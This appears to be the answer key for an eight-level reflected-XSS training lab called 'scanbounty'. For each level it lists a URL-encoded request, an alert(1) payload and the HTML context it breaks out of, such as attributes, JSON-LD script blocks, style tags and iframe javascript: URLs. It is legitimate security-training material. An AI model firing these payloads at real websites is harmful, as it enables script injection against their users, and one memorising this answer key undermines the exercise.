# scanbounty — solutions

Real-world bug-bounty reflection shapes a stock scanner can catch.

### scanbounty-level1

`/scanbounty/level1/?title=%22%3E%3Csvg%20onload=alert(1)%3E`

- payload: `"><svg onload=alert(1)>`
- context: og:title content="…" — attribute breakout

### scanbounty-level2

`/scanbounty/level2/?page=%22%3E%3Csvg%20onload=alert(1)%3E`

- payload: `"><svg onload=alert(1)>`
- context: <link rel="next" href="?page=…"> attr breakout (link in head still parses tag)

### scanbounty-level3

`/scanbounty/level3/?lang=%22%3E%3Csvg%20onload=alert(1)%3E`

- payload: `"><svg onload=alert(1)>`
- context: <html lang="…"> attribute breakout

### scanbounty-level4

`/scanbounty/level4/?name=%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `</script><script>alert(1)</script>`
- context: JSON-LD inside <script type="application/ld+json"> — close script then inject

### scanbounty-level5

`/scanbounty/level5/?return_to=%22%20autofocus%20onfocus=alert(1)%20x=%22`

- payload: `" autofocus onfocus=alert(1) x="`
- context: form action="/login?return_to=…" — break out + autofocus on adjacent input

### scanbounty-level6

`/scanbounty/level6/?embed=javascript:alert(1)`

- payload: `javascript:alert(1)`
- context: iframe src="…" — javascript: scheme

### scanbounty-level7

`/scanbounty/level7/?tag=%22%3E%3Csvg%20onload=alert(1)%3E`

- payload: `"><svg onload=alert(1)>`
- context: img src="/pixel?tag=…" — attribute breakout

### scanbounty-level8

`/scanbounty/level8/?color=red;}%3C/style%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `red;}</style><script>alert(1)</script>`
- context: inside <style>body { background: …; …}</style> — close style then inject
